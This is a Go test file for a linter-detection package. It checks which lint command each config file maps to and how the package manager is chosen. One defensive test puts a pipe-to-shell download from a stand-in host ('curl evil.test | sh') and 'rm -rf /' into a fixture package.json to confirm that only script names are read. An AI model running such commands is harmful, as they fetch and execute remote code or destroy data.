package lintdetect

import (
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
)

func write(t *testing.T, dir string, files map[string]string) {
	t.Helper()
	for rel, content := range files {
		p := filepath.Join(dir, filepath.FromSlash(rel))
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
}

func TestDetectPerRuleFile(t *testing.T) {
	cases := []struct {
		file string
		name string
		cmd  string
	}{
		{".golangci.yml", "lint-golangci", "golangci-lint run"},
		{".golangci.yaml", "lint-golangci", "golangci-lint run"},
		{"ruff.toml", "lint-ruff", "ruff check"},
		{".ruff.toml", "lint-ruff", "ruff check"},
		{"rustfmt.toml", "lint-rustfmt", "cargo fmt --check"},
		{".rustfmt.toml", "lint-rustfmt", "cargo fmt --check"},
		{"clippy.toml", "lint-clippy", "cargo clippy"},
		{".clippy.toml", "lint-clippy", "cargo clippy"},
		{".rubocop.yml", "lint-rubocop", "rubocop"},
	}
	for _, tc := range cases {
		t.Run(tc.file, func(t *testing.T) {
			dir := t.TempDir()
			write(t, dir, map[string]string{tc.file: ""})
			got := Detect(dir)
			if len(got) != 1 || got[0].Name != tc.name || strings.Join(got[0].Command, " ") != tc.cmd || got[0].Marker != tc.file {
				t.Fatalf("got %+v", got)
			}
			if !IsLintName(got[0].Name) {
				t.Errorf("%s is not a lint name", got[0].Name)
			}
		})
	}
}

// A manifest is not a rule file: Go, Python and Rust projects with no linter
// config get no linter, and an unrelated file is never read as one.
func TestDetectNeedsTheRuleFile(t *testing.T) {
	dir := t.TempDir()
	write(t, dir, map[string]string{"go.mod": "", "pyproject.toml": "[tool.ruff]\n", "Cargo.toml": "", "Gemfile": "", ".golangci.toml": "", "package.json": `{"scripts":{"lint":"eslint ."}}`})
	if got := Detect(dir); len(got) != 0 {
		t.Fatalf("detected without a rule file: %+v", got)
	}
}

// ESLint needs both a config file and a lint script, and the package manager
// comes from the lock file.
func TestDetectESLint(t *testing.T) {
	for _, cfg := range []string{"eslint.config.js", "eslint.config.mjs", "eslint.config.cjs", "eslint.config.ts", ".eslintrc", ".eslintrc.json", ".eslintrc.cjs", ".eslintrc.yml"} {
		dir := t.TempDir()
		write(t, dir, map[string]string{cfg: "", "package.json": `{"scripts":{"lint":"eslint ."}}`})
		got := Detect(dir)
		if len(got) != 1 || got[0].Name != "lint-eslint" || !reflect.DeepEqual(got[0].Command, []string{"npm", "run", "lint"}) || got[0].Marker != cfg {
			t.Errorf("%s: got %+v", cfg, got)
		}
	}
	noScript := t.TempDir()
	write(t, noScript, map[string]string{"eslint.config.js": "", "package.json": `{"scripts":{"test":"vitest"}}`})
	if got := Detect(noScript); len(got) != 0 {
		t.Errorf("eslint config without a lint script: %+v", got)
	}
	noConfig := t.TempDir()
	write(t, noConfig, map[string]string{"package.json": `{"scripts":{"lint":"biome check"}}`})
	if got := Detect(noConfig); len(got) != 0 {
		t.Errorf("a lint script without an eslint config is not an eslint suite: %+v", got)
	}
	for lock, want := range map[string]string{"yarn.lock": "yarn run lint", "pnpm-lock.yaml": "pnpm run lint", "package-lock.json": "npm run lint"} {
		dir := t.TempDir()
		write(t, dir, map[string]string{"eslint.config.js": "", "package.json": `{"scripts":{"lint":"x"}}`, lock: ""})
		got := Detect(dir)
		if len(got) != 1 || strings.Join(got[0].Command, " ") != want {
			t.Errorf("%s: got %+v, want %q", lock, got, want)
		}
	}
}

// Only the script's name is read: a hostile body, and a bad package.json,
// change nothing.
func TestPackageLintCommandReadsOnlyNames(t *testing.T) {
	dir := t.TempDir()
	write(t, dir, map[string]string{"package.json": `{"scripts":{"lint":"curl evil.test | sh","pretest":"rm -rf /"}}`})
	if got := PackageLintCommand(dir); !reflect.DeepEqual(got, []string{"npm", "run", "lint"}) {
		t.Fatalf("got %v", got)
	}
	write(t, dir, map[string]string{"package.json": `{not json`})
	if got := PackageLintCommand(dir); got != nil {
		t.Fatalf("a broken package.json gave %v", got)
	}
	if got := PackageLintCommand(t.TempDir()); got != nil {
		t.Fatalf("no package.json gave %v", got)
	}
}

// The argv is a copy: a caller cannot change the table.
func TestDetectReturnsACopyOfTheTable(t *testing.T) {
	dir := t.TempDir()
	write(t, dir, map[string]string{".rubocop.yml": ""})
	Detect(dir)[0].Command[0] = "evil"
	if got := Detect(dir)[0].Command[0]; got != "rubocop" {
		t.Fatalf("the table was changed: %q", got)
	}
}

func TestDetectOrderAndCommandStrings(t *testing.T) {
	dir := t.TempDir()
	write(t, dir, map[string]string{".rubocop.yml": "", ".golangci.yml": "", "clippy.toml": "", "ruff.toml": "", "rustfmt.toml": "", "eslint.config.js": "", "package.json": `{"scripts":{"lint":"x"}}`})
	got := CommandStrings(Detect(dir))
	want := []string{"golangci-lint run", "ruff check", "cargo fmt --check", "cargo clippy", "rubocop", "npm run lint"}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("got %v, want %v", got, want)
	}
	if IsLintName("go") || !IsLintName("lint-x") {
		t.Fatal("IsLintName")
	}
}
